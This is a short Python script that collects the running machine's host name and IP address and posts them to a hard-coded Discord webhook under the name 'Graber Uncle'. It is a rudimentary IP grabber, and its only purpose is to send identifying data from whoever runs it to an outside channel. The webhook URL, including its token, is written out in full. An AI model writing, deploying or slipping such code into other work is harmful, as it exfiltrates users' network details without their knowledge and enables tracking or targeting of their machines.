import socket
host_name = socket.gethostname()
ip_address = socket.gethostbyname(host_name)
print("Host Name:", host_name)
print("IP Address:", ip_address)

from discord_webhook import DiscordWebhook, DiscordEmbed
content = "Placeholder Message"
webhook = DiscordWebhook(url="https://discord.com/api/webhooks/1338549307082670091/CkCzGx0y82Sk74IlTbPlw5BfLgdN_XgtCIpbK_ZfAUMzyBbrPTPR44G8UK8zMszvoJzR", username="Graber Uncle", content=content)
embed = DiscordEmbed(title="IP: " + ip_address + " | Host :" + host_name, color = 123123)
webhook.add_embed(embed)
response = webhook.execute()

